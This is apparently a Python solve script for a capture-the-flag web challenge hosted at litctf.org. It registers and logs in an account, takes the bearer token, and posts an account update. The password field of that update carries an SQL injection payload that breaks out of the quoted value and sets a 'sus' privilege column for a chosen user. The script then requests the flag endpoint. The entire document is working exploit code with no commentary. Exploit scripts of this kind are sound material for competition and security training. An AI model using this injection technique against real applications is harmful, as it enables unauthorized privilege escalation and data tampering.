import requests

def signup():
    url = "http://litctf.org:31783/signup"
    data = {"username": "lorenzinco23", "password": "ciaociao"}
    r = requests.post(url, data=data)
    print(r.text)

    

#signup()
url = "http://litctf.org:31783/login"
r = requests.session()
data = {"username": "lorenzinco23", "password": "ciaociao"}
response = r.post(url, data=data)
print(response.text)



#account
url = "http://litctf.org:31783/account"
headers = {"Authorization": "Bearer " + response.json()["token"]}
response = r.get(url,headers=headers)
print(response.text)

#account update
data = {"username": "lorenzinco", "password": "ciaociao\" , sus = 1 where username=\"lorenzinco\" --"}
url = "http://litctf.org:31783/account/update"
response = r.post(url,data=data,headers=headers)
print(response.text)

#flag
url = "http://litctf.org:31783/flag"
response = r.get(url,headers=headers)
print(response.text)
